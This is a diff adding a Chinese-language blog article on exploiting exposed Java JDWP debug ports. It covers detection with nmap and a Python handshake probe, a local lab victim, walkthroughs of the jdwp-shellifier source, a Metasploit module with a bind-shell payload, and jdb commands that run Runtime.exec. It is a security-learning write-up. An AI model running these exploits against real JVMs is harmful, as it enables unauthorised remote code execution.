@@ -5717,4 +5717,377 @@ at com.hollis.lab.fastjson.test.FastJsonTest.main(FastJsonTest.java:26)
         <tag>反序列化</tag>
       </tags>
   </entry>
+  <entry>
+    <title>JDWP攻击原理分析</title>
+    <url>/2023/06/08/JDWP/</url>
+    <content><![CDATA[<h1 id="JDWP协议"><a href="#JDWP协议" class="headerlink" title="JDWP协议"></a>JDWP协议</h1><p>JDWP（Java Debug Wire Protocol Transport Interface）协议是用于调试器（debugger）和被调试的Java虚拟机（Target VM）之前的通信协议。如果一个应用在本地调试没出问题，而在线上出现了问题，就可以开启JDWP远程调试来解决问题，然后就有可能被利用。</p>
+<p><img src="/images/20230608131742.png"></p>
+<p>JDWP是一个基于二进制包的网络协议。<br>JDWP大致分为两个阶段：握手（handshake）和应答。</p>
+<p><img src="/images/20230608131759.png"></p>
+<p>握手结束后，Debugger就可以向Target VM发送命令了。JDWP是通过命令包（command packet）和回复包（reply packet）来进行通信的。JDWP本身是无状态的，因此对命令出现的顺序并不受限制。</p>
+<p>Debugger通过命令包获取Target VM 的信息以及控制程序的执行，Target VM通过发送命令包通知Debugger某些事件的发生，如到达断点或是产生异常。回复包是用来回复命令包的，表示该命令是否执行成功。如果执行成功，回复包还可能包含有命令包请求的数据，如变量的值等。而从Target VM发出的命令包是不需要回复的。</p>
+<p>JDWP是异步的，不需要等待接收到前一个命令包的回复包就可以发送下一个命令包。</p>
+<h1 id="JPDA"><a href="#JPDA" class="headerlink" title="JPDA"></a>JPDA</h1><p>JPDA（Java Platform Debugger Architecture）：即Java平台调试体系架构。Java虚拟机设计的专门的API接口供调试和监控虚拟机使用。</p>
+<p>JPDA按照抽象层次，又分为三层，分别是：</p>
+<ul>
+<li>JVM TI（Java VM Tool Interface）：虚拟机对外暴露的接口，包括debug和profile。</li>
+<li>JDI（Java Debug Interface）：Java库接口，实现了JDWP协议的客户端，调试器可以用来和远程被调试应用通信。</li>
+<li>JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息，在调试Android应用程序这一场景中，Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，而 Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。</li>
+</ul>
+<h1 id="JDWP通信格式"><a href="#JDWP通信格式" class="headerlink" title="JDWP通信格式"></a>JDWP通信格式</h1><p><img src="/images/20230608131905.png"></p>
+<p><code>id</code>和<code>length</code>的含义非常简单。<code>flag</code>字段用于表明是请求包还是返回包，如果<code>flag</code>是<code>0x80</code>就表示一个返回包。<code>CommandSet</code>定义了<code>Command</code>的类别。</p>
+<ul>
+<li><code>0x40</code>,JVM的行为，例如打断点;</li>
+<li><code>0x40–0x7F</code>，当运行到断点处，JVM需要进行进一步的操作;</li>
+<li><code>0x80</code>，第三方扩展;</li>
+</ul>
+<h2 id="JDWP关键方法"><a href="#JDWP关键方法" class="headerlink" title="JDWP关键方法"></a>JDWP关键方法</h2><ol>
+<li><code>VirtualMachine/IDSizes</code> 确定了能够被JVM处理的数据包的大小.</li>
+<li><code>ClassType/InvokeMethod</code> 允许你唤起一个静态函数</li>
+<li><code>ObjectReference/InvokeMethod</code> 、允许你唤起JVM中一个实例化对象的方法;</li>
+<li><code>StackFrame/(Get|Set)</code> 提供了线程堆栈的pushing&#x2F;popping的功能;</li>
+<li><code>Event/Composite</code>强制JVM执行此命令的行为，此命令是调试需要的密钥。这个事件能够要求JVM按照其意愿设置断点，单步调试，以及类似与像GDB或者WinGDB的方式一样进行调试。JDWP提供了内置命令来将任意类加载到JVM内存中并调用已经存在和&#x2F;或新加载的字节码。</li>
+</ol>
+<p>对应脚本jdwp-shellifier的运行过程：</p>
+<ol>
+<li>与Target VM 握手，建立连接</li>
+<li>向JVM发出请求获取IDSizes</li>
+<li>向JVM发出请求获取JVM的版本信息</li>
+<li>向JVM发出请求获取所有的类信息，其中包含有referenceTypeID</li>
+</ol>
+<p><img src="/images/20230608132813.png"></p>
+<ol start="5">
+<li><p>从得到的类信息中提取出java.lang.Runtime类的referenceTypeID</p>
+</li>
+<li><p>由于Runtime类只能通过getRuntime方法获取，因此还需要向服务器请求获取方法信息</p>
+</li>
+</ol>
+<p><img src="/images/20230608132835.png"></p>
+<ol start="7">
+<li>从得到的方法信息中提取出getRuntime方法的referenceTypeID</li>
+<li>给需要指定的方法添加断点，默认是java.net.ServerSocket.accept，因为在windows平台下进行jdwp调试只能使用socket类型，且该函数调用比较频繁。</li>
+<li>当断点触发时，我们就可以得到被调试方法所运行的线程ID<br><img src="/images/20230608132908.png"></li>
+<li>清除断点并恢复线程运行</li>
+<li>创建执行命令的字符串对象，并通过回复包获取该对象ID：</li>
+</ol>
+<p><img src="/images/20230608132923.png"><br>12. 调用方法命令调用静态方法getRuntime并获取对应的对象ID:</p>
+<p><img src="/images/20230608132937.png"></p>
+<ol start="13">
+<li>上次请求过方法信息，从之前请求的方法信息中可获取到exec方法的referenceTypeID</li>
+<li>通过对象的方法调用命令调用exec函数就可以执行命令了:<br><img src="/images/20230608133002.png"></li>
+</ol>
+<h1 id="JDWP探测"><a href="#JDWP探测" class="headerlink" title="JDWP探测"></a>JDWP探测</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre><code>nmap -sT 127.0.0.1 -p8000 -sV
+</code></pre>
+<h2 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h2><p>规则配置文件：<br><a href="https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-masscan.cfg">https://github.com/IOActive/jdwp-shellifier/blob/master/jdwp-masscan.cfg</a></p>
+<h2 id="自实现"><a href="#自实现" class="headerlink" title="自实现"></a>自实现</h2><pre><code>import socket
+
+client = socket.socket()
+client.connect((&quot;127.0.0.1&quot;, 8000))
+client.send(&quot;JDWP-Handshake&quot;)
+
+if client.recv(14)==&quot;JDWP-Handshake&quot;:
+    print &quot;[*] Detected JDWP service&quot;
+
+client.close()
+</code></pre>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>靶机：</p>
+<pre><code>@SpringBootApplication
+public class JdwpDemoApplication &#123;
+
+    public static void main(String[] args) &#123;
+        SpringApplication.run(JdwpDemoApplication.class, args);
+    &#125;
+
+    @RequestMapping(path = &#123;&quot;/&quot;,&quot;/index&quot;&#125;, method = &#123;RequestMethod.GET&#125;)
+    public String index()&#123;
+        boolean t = &quot;test&quot;.endsWith(&quot;t&quot;);
+        System.out.println(t);
+        return &quot;index&quot;;
+    &#125;
+
+&#125;
+</code></pre>
+<p>打成jar包，用以下参数启动远程debug：</p>
+<pre><code>java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar demo.jar
+</code></pre>
+<h2 id="jdwp-shellifier利用"><a href="#jdwp-shellifier利用" class="headerlink" title="jdwp-shellifier利用"></a>jdwp-shellifier利用</h2><p>项目地址:<br><a href="https://github.com/IOActive/jdwp-shellifier">https://github.com/IOActive/jdwp-shellifier</a></p>
+<p>jdwp-shellifier利用方式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">% python ./jdwp-shellifier.py -h</span><br><span class="line">usage: jdwp-shellifier.py [-h] -t IP [-p PORT] [--break-on JAVA_METHOD]</span><br><span class="line">                      [--cmd COMMAND]</span><br><span class="line"></span><br><span class="line">Universal exploitation script for JDWP by @_hugsy_</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">-h, --help            show this help message and exit</span><br><span class="line">-t IP, --target IP    Remote target IP (default: None)</span><br><span class="line">-p PORT, --port PORT  Remote target port (default: 8000)</span><br><span class="line">--break-on JAVA_METHOD</span><br><span class="line">Specify full path to method to break on (default:</span><br><span class="line">    java.net.ServerSocket.accept)</span><br><span class="line">    --cmd COMMAND         Specify full path to method to break on (default:</span><br><span class="line">        None)</span><br></pre></td></tr></table></figure>
+
+<p>先启动我们的受害者端：</p>
+<pre><code>java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=9999 -jar demo.jar
+</code></pre>
+<p><img src="/images/20230608162831.png"></p>
+<p>启动jdwp-shellifier脚本，使用如下参数，下出断点</p>
+<pre><code>python ./jdwp-shellifier.py -t 127.0.0.1 -p 9999 --cmd calc --break-on java.lang.String.endsWith
+</code></pre>
+<p><img src="/images/20230608162920.png"></p>
+<p>这时断点已经下在了<code>boolean t = &quot;test&quot;.endsWith(&quot;t&quot;);</code>，我们手动访问<code>http://localhost:8080</code>触发这个断点</p>
+<p><img src="/images/20230608163112.png"></p>
+<p>当断点触发时，我们就可以得到被调试方法所运行的线程ID，成功触发以后的链，导致命令执行</p>
+<p><img src="/images/20230608163406.png"></p>
+<h2 id="jdwp-shellifier分析"><a href="#jdwp-shellifier分析" class="headerlink" title="jdwp-shellifier分析"></a>jdwp-shellifier分析</h2><p>main函数中首先接受参数，<code>break-on</code>的参数会把方法名和调用方法分割。然后调用<code>start()</code>方法</p>
+<pre><code>if __name__ == &quot;__main__&quot;:
+    parser = argparse.ArgumentParser(description=&quot;Universal exploitation script for JDWP by @_hugsy_&quot;,
+                                    formatter_class=argparse.ArgumentDefaultsHelpFormatter )
+
+    parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, type=str, metavar=&quot;IP&quot;, help=&quot;Remote target IP&quot;, required=True)
+    parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, type=int, metavar=&quot;PORT&quot;, default=8000, help=&quot;Remote target port&quot;)
+
+    parser.add_argument(&quot;--break-on&quot;, dest=&quot;break_on&quot;, type=str, metavar=&quot;JAVA_METHOD&quot;,
+                        default=&quot;java.net.ServerSocket.accept&quot;, help=&quot;Specify full path to method to break on&quot;)
+    parser.add_argument(&quot;--cmd&quot;, dest=&quot;cmd&quot;, type=str, metavar=&quot;COMMAND&quot;,
+                        help=&quot;Specify command to execute remotely&quot;)
+
+    args = parser.parse_args()
+
+    classname, meth = str2fqclass(args.break_on)
+    setattr(args, &quot;break_on_class&quot;, classname)
+    setattr(args, &quot;break_on_method&quot;, meth)
+
+    retcode = 0
+
+    try:
+        cli = JDWPClient(args.target, args.port)
+        cli.start()
+</code></pre>
+<p>我们看到start()方法:</p>
+<pre><code>def start(self):
+    self.handshake(self.host, self.port)
+    self.idsizes()
+    self.getversion()
+    self.allclasses()
+    return
+</code></pre>
+<p>首先是握手协议</p>
+<pre><code>def handshake(self, host, port):
+    s = socket.socket()
+    try:
+        s.connect( (host, port) )
+    except socket.error as msg:
+        raise Exception(&quot;Failed to connect: %s&quot; % msg)
+
+    s.send( HANDSHAKE )
+
+    if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
+        raise Exception(&quot;Failed to handshake&quot;)
+    else:
+        self.socket = s
+
+    return
+</code></pre>
+<p>通过<code>socket</code>发送<code>JDWP-Handshake</code>包。如果相应包也是<code>JDWP-Handshake</code>表示握手成功。</p>
+<p>之后调用idsizes(self)方法：</p>
+<pre><code>IDSIZES_SIG               = (1, 7)
+
+def idsizes(self):
+    self.socket.sendall( self.create_packet(IDSIZES_SIG) )
+    buf = self.read_reply()
+    formats = [ (&quot;I&quot;, &quot;fieldIDSize&quot;), (&quot;I&quot;, &quot;methodIDSize&quot;), (&quot;I&quot;, &quot;objectIDSize&quot;),
+                (&quot;I&quot;, &quot;referenceTypeIDSize&quot;), (&quot;I&quot;, &quot;frameIDSize&quot;) ]
+    for entry in self.parse_entries(buf, formats, False):
+        for name,value  in entry.iteritems():
+            setattr(self, name, value)
+    return
+</code></pre>
+<p>通过向服务端发送<code>IDSIZES_SIG = (1, 7)</code>的包，然后利用<code>parse_entries()</code>方法得到一些JDWP的属性，包括<code>fieldIDSize</code>,<code>methodIDSize</code>等属性。运行完毕之后得到的属性如下：</p>
+<p><img src="/images/20230608164446.png"></p>
+<p>之后运行<code>getversion()</code>方法，得到JVM相关的配置信息。</p>
+<p><img src="/images/20230608164628.png"></p>
+<p>运行<code>allclasses()</code></p>
+<pre><code>ALLCLASSES_SIG            = (1, 3)
+
+def allclasses(self):
+    try:
+        getattr(self, &quot;classes&quot;)
+    except:
+        self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
+        buf = self.read_reply()
+        formats = [ (&#39;C&#39;, &quot;refTypeTag&quot;),
+                    (self.referenceTypeIDSize, &quot;refTypeId&quot;),
+                    (&#39;S&#39;, &quot;signature&quot;),
+                    (&#39;I&#39;, &quot;status&quot;)]
+        self.classes = self.parse_entries(buf, formats)
+
+    return self.classes
+</code></pre>
+<p>通过<code>socket</code>发送<code>ALLCLASSES_SIG = (1, 3)</code>的包，利用<code>parse_entries()</code>解析返回包的数据，得到<code>refTypeTag</code>,<code>refTypeId</code>,<code>signature</code>,<code>status</code>等信息。以下就是得到所有的结果：</p>
+<p><img src="/images/20230608164925.png"></p>
+<p><code>start()</code>方法运行完毕，之后运行<code>runtime_exec()</code>方法</p>
+<pre><code>def runtime_exec(jdwp, args):
+    print (&quot;[+] Targeting &#39;%s:%d&#39;&quot; % (args.target, args.port))
+    print (&quot;[+] Reading settings for &#39;%s&#39;&quot; % jdwp.version)
+
+    # 1. get Runtime class reference
+    runtimeClass = jdwp.get_class_by_name(&quot;Ljava/lang/Runtime;&quot;)
+    if runtimeClass is None:
+        print (&quot;[-] Cannot find class Runtime&quot;)
+        return False
+    print (&quot;[+] Found Runtime class: id=%x&quot; % runtimeClass[&quot;refTypeId&quot;])
+
+    # 2. get getRuntime() meth reference
+    jdwp.get_methods(runtimeClass[&quot;refTypeId&quot;])
+    getRuntimeMeth = jdwp.get_method_by_name(&quot;getRuntime&quot;)
+    if getRuntimeMeth is None:
+        print (&quot;[-] Cannot find method Runtime.getRuntime()&quot;)
+        return False
+    print (&quot;[+] Found Runtime.getRuntime(): id=%x&quot; % getRuntimeMeth[&quot;methodId&quot;])
+
+    # 3. setup breakpoint on frequently called method
+    c = jdwp.get_class_by_name( args.break_on_class )
+    if c is None:
+        print(&quot;[-] Could not access class &#39;%s&#39;&quot; % args.break_on_class)
+        print(&quot;[-] It is possible that this class is not used by application&quot;)
+        print(&quot;[-] Test with another one with option `--break-on`&quot;)
+        return False
+
+    jdwp.get_methods( c[&quot;refTypeId&quot;] )
+    m = jdwp.get_method_by_name( args.break_on_method )
+    if m is None:
+        print(&quot;[-] Could not access method &#39;%s&#39;&quot; % args.break_on)
+        return False
+
+    loc = chr( TYPE_CLASS )
+    loc+= jdwp.format( jdwp.referenceTypeIDSize, c[&quot;refTypeId&quot;] )
+    loc+= jdwp.format( jdwp.methodIDSize, m[&quot;methodId&quot;] )
+    loc+= struct.pack(&quot;&gt;II&quot;, 0, 0)
+    data = [ (MODKIND_LOCATIONONLY, loc), ]
+    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
+    print (&quot;[+] Created break event id=%x&quot; % rId)
+
+    # 4. resume vm and wait for event
+    jdwp.resumevm()
+
+    print (&quot;[+] Waiting for an event on &#39;%s&#39;&quot; % args.break_on)
+    while True:
+        buf = jdwp.wait_for_event()
+        ret = jdwp.parse_event_breakpoint(buf, rId)
+        if ret is not None:
+            break
+
+    rId, tId, loc = ret
+    print (&quot;[+] Received matching event from thread %#x&quot; % tId)
+
+    jdwp.clear_event(EVENT_BREAKPOINT, rId)
+
+    # 5. Now we can execute any code
+    if args.cmd:
+        runtime_exec_payload(jdwp, tId, runtimeClass[&quot;refTypeId&quot;], getRuntimeMeth[&quot;methodId&quot;], args.cmd)
+    else:
+        # by default, only prints out few system properties
+        runtime_exec_info(jdwp, tId)
+
+    jdwp.resumevm()
+
+    print (&quot;[!] Command successfully executed&quot;)
+
+    return True
+</code></pre>
+<p><code>runtime_exec()</code>方法通过<code>invoke</code>的方式得到<code>Runtime</code>对象，然后利用<code>Runtime</code>对象进一步执行命令，从而最终达到RCE。 </p>
+<p>第一步，得到<code>Runtime</code>类</p>
+<pre><code># 1. get Runtime class reference
+runtimeClass = jdwp.get_class_by_name(&quot;Ljava/lang/Runtime;&quot;)
+if runtimeClass is None:
+    print (&quot;[-] Cannot find class Runtime&quot;)
+    return False
+print (&quot;[+] Found Runtime class: id=%x&quot; % runtimeClass[&quot;refTypeId&quot;])
+</code></pre>
+<p>第二步，得到<code>getRuntime()</code>方法</p>
+<pre><code># 2. get getRuntime() meth reference
+jdwp.get_methods(runtimeClass[&quot;refTypeId&quot;])
+getRuntimeMeth = jdwp.get_method_by_name(&quot;getRuntime&quot;)
+if getRuntimeMeth is None:
+    print (&quot;[-] Cannot find method Runtime.getRuntime()&quot;)
+    return False
+print (&quot;[+] Found Runtime.getRuntime(): id=%x&quot; % getRuntimeMeth[&quot;methodId&quot;])
+</code></pre>
+<p>第三步，得到断点设置的类和方法，向JVM发送数据，在<code>java.lang.String.endsWith.accept()</code>下断点</p>
+<pre><code># 3. setup breakpoint on frequently called method
+c = jdwp.get_class_by_name( args.break_on_class )
+if c is None:
+    print(&quot;[-] Could not access class &#39;%s&#39;&quot; % args.break_on_class)
+    print(&quot;[-] It is possible that this class is not used by application&quot;)
+    print(&quot;[-] Test with another one with option `--break-on`&quot;)
+    return False
+
+jdwp.get_methods( c[&quot;refTypeId&quot;] )
+m = jdwp.get_method_by_name( args.break_on_method )
+if m is None:
+    print(&quot;[-] Could not access method &#39;%s&#39;&quot; % args.break_on)
+    return False
+
+loc = chr( TYPE_CLASS )
+loc+= jdwp.format( jdwp.referenceTypeIDSize, c[&quot;refTypeId&quot;] )
+loc+= jdwp.format( jdwp.methodIDSize, m[&quot;methodId&quot;] )
+loc+= struct.pack(&quot;&gt;II&quot;, 0, 0)
+data = [ (MODKIND_LOCATIONONLY, loc), ]
+rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
+print (&quot;[+] Created break event id=%x&quot; % rId)
+</code></pre>
+<p>第四步，等待程序运行至断点处，运行完毕之后清除断点。</p>
+<pre><code># 4. resume vm and wait for event
+jdwp.resumevm()
+
+print (&quot;[+] Waiting for an event on &#39;%s&#39;&quot; % args.break_on)
+while True:
+    # 等待程序运行至断点处
+    buf = jdwp.wait_for_event()
+    ret = jdwp.parse_event_breakpoint(buf, rId)
+    if ret is not None:
+        break
+
+rId, tId, loc = ret
+print (&quot;[+] Received matching event from thread %#x&quot; % tId)
+#运行完毕之后清除断点。
+jdwp.clear_event(EVENT_BREAKPOINT, rId)
+</code></pre>
+<p>第五步，执行自定义的命令</p>
+<pre><code># 5. Now we can execute any code
+if args.cmd:
+    runtime_exec_payload(jdwp, tId, runtimeClass[&quot;refTypeId&quot;], getRuntimeMeth[&quot;methodId&quot;], args.cmd)
+else:
+    # by default, only prints out few system properties
+    runtime_exec_info(jdwp, tId)
+
+jdwp.resumevm()
+
+print (&quot;[!] Command successfully executed&quot;)
+
+return True
+</code></pre>
+<p>总结一下流程：</p>
+<ol>
+<li>初始化，获取各种信息</li>
+<li>第一步，得到<code>Runtime</code>类</li>
+<li>得到<code>getRuntime()</code>方法</li>
+<li>得到断点设置处的类和方法，设置断点</li>
+<li>等待程序运行至断点处，运行完毕之后清除断点。</li>
+<li>执行自定义的命令</li>
+</ol>
+<p><code>jdwp-shellifier</code>把协议访问的一些细节都封装好了，直接用就行了</p>
+<h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p>在msf中可以使用exploit&#x2F;multi&#x2F;misc&#x2F;java_jdwp_debugger模块进行攻击利用。</p>
+<p>原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。</p>
+<pre><code>use exploit/multi/misc/java_jdwp_debugger
+set rhosts x.x.x.x
+set payload linux/x64/shell/bind_tcp 
+run
+</code></pre>
+<h2 id="jdb"><a href="#jdb" class="headerlink" title="jdb"></a>jdb</h2><p>jdb是JDK中自带的命令行调试工具。</p>
+<p>这里是按照msf中的方式搞：</p>
+<ol>
+<li>attach到远程JDWP服务；<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8000</span><br></pre></td></tr></table></figure></li>
+<li>threads命令查看所有线程，查找sleeping的线程；<br><img src="/images/20230608171258.png"></li>
+<li>thread sleeping的线程id，然后stepi进入该线程；<br><img src="/images/20230608171322.png"></li>
+<li>通过print|dump|eval命令，执行Java表达式从而达成命令执行；<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>
+<img src="/images/20230608171354.png"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>java安全</tag>
+        <tag>JDWP</tag>
+      </tags>
+  </entry>
 </search>
